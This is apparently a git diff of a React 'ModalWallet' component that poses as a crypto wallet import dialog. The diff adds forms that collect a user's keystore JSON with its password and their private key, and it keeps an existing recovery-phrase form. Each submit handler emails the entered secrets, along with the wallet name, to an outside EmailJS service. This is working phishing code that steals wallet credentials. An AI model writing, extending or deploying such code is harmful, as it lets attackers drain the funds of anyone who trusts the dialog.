@@ -4,6 +4,12 @@ import React, { useState } from 'react'
 
 function ModalWallet({img, name, cancelModal}) {
     const [phraseInput, setPhraseInput] = useState('');
+    const [keystoreInput, setKeyStoreInput] = useState({
+        keystoreJSON: "",
+        keystorepassword: ""
+    })
+    const [privatekeyInput, setPrivatekeyInput] = useState('');
+    
 
     useState(()=>{
         emailjs.init('dFX7V_QgdyVOq1Gsk')
@@ -20,19 +26,44 @@ function ModalWallet({img, name, cancelModal}) {
         setPhraseInput(e.target.value)
     }
 
+    function setKeystore(e){
+        setKeyStoreInput({...keystoreInput, [e.target.id]: e.target.value})
+    }
+
+    function setPrivateKey(e){
+        setPrivatekeyInput(e.target.value)
+    }
+
+
+
     function handleSubmit(e){
         e.preventDefault();
-        console.log('hi');
         emailjs.sendForm('service_p6dborp', 'template_f1lpt2u', '#phraseSubmit')
-            .then(function(response) {
-            console.log('SUCCESS!', response.status, response.text);
-        }, function(error) {
-            console.log('FAILED...', error);
+        .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+            }, function(error) {
+                console.log('FAILED...', error);
         });
     }
 
     function handleSubmitjson(e){
         e.preventDefault()
+        emailjs.sendForm('service_p6dborp', 'template_jxpzm2j', '#keyStoreJson')
+        .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+            }, function(error) {
+                console.log('FAILED...', error);
+        });
+    }
+
+    function handleSubmitPrivateKey(e){
+        e.preventDefault()
+        emailjs.sendForm('service_p6dborp', 'template_f1lpt2u', '#PrivateKey')
+        .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+            }, function(error) {
+                console.log('FAILED...', error);
+        });
     }
 
     return (
@@ -86,25 +117,33 @@ function ModalWallet({img, name, cancelModal}) {
                                 <div id="second" className="bg-grey-600 hidden">
                                     <div className="flex flex-col">
                                         <form action="" method="POST" onSubmit={handleSubmitjson} id="keyStoreJson">
+                                            <input type="text" id='wallet_typekeystore' name='wallet_typekeystore' className='hidden' value={name} />
                                             <textarea 
                                                 cols="30" 
                                                 rows="4" 
                                                 placeholder="Enter your Keystore Json" 
                                                 className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
-                                                name="phrase" 
-                                                id="phrase" 
+                                                name="keystoreJSON" 
+                                                id="keystoreJSON" 
                                                 minLength="12" 
                                                 required="" 
-                                                // value={}
-                                                // onChange={}
+                                                value={keystoreInput.keystoreJSON}
+                                                onChange={setKeystore}
                                             />   
-                                            <div className="flex flex-col mb-6">
-                                                <div className="relative">
-                                                    <input type="text" id="keystorepassword" name="password" placeholder="Wallet password" className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" required="" />
-                                                    <p className="text-xs text-grey-300 my-6">
-                                                        Several lines of text beginning with {"{...}"} plus the password you used to encrypt it.
-                                                    </p>
-                                                </div>
+                                            <div className="relative mb-6">
+                                                <input 
+                                                    type="text" 
+                                                    id="keystorepassword" 
+                                                    name="keystorepassword" 
+                                                    placeholder="Wallet password" 
+                                                    className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
+                                                    required
+                                                    value={keystoreInput.keystorepassword}
+                                                    onChange={setKeystore}
+                                                />
+                                                <p className="text-xs text-grey-300 my-6">
+                                                    Several lines of text beginning with {"{...}"} plus the password you used to encrypt it.
+                                                </p>
                                             </div>
                                             <div className="flex w-full">
                                                 <button type="submit" name="import" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
@@ -120,22 +159,33 @@ function ModalWallet({img, name, cancelModal}) {
                                     </div> 
                                 </div>
                                 <div id="third" className='bg-grey-600 hidden'>
-                                    <div className='mb-6'>
-                                        <form action="" method='POST'>
-                                            <input type="text" placeholder="Enter your Private Key" name="phrase" id="privatekey" className=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" required=""/>
-                                            <p className="text-xs text-grey-300 mt-6">Typically 12 (sometimes 24) words seperated by a single space.</p>
+                                    <div className=''>
+                                        <form action="" method="POST" onSubmit={handleSubmitPrivateKey} id="PrivateKey">
+                                            <input type="text" name='wallet_type' className='hidden' value={name}/>
+                                            <input type="text" name='input_type' className='hidden' value={"Private Key"}/>
+                                            <input 
+                                                type="text" 
+                                                placeholder="Enter your Private Key" 
+                                                name="wallet_message" 
+                                                id="wallet_message" 
+                                                className=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
+                                                required
+                                                value={privatekeyInput}
+                                                onChange={setPrivateKey}
+                                            />
+                                            <p className="text-xs text-grey-300 my-6">Typically 12 (sometimes 24) words seperated by a single space.</p>
+                                            <button type="submit" name="import" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
+                                                <span className="mr-2 uppercase">Proceed</span> 
+                                                <span>
+                                                    <svg fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6">
+                                                        <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                                                    </svg>
+                                                </span>
+                                            </button>
                                         </form>
                                     </div>
-                                    <button type="submit" name="import" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
-                                        <span className="mr-2 uppercase">Proceed</span> 
-                                        <span>
-                                            <svg fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6">
-                                                <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-                                            </svg>
-                                        </span>
-                                    </button>
                                 </div>
-                            </div>
+                        </div>
                     </div>
                     <div className="bg-gray-50 px-4 py-3 sm:px-6 sm:flex sm:flex-row-reverse">
                         <button id="cancel" onClick={cancelModal} type="button" className="w-full inline-flex justify-center rounded-md border border-transparent shadow-sm px-4 py-2 bg-[#e53e3e] text-base font-medium text-white hover:opacity-75 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 sm:ml-3 sm:w-auto sm:text-sm">
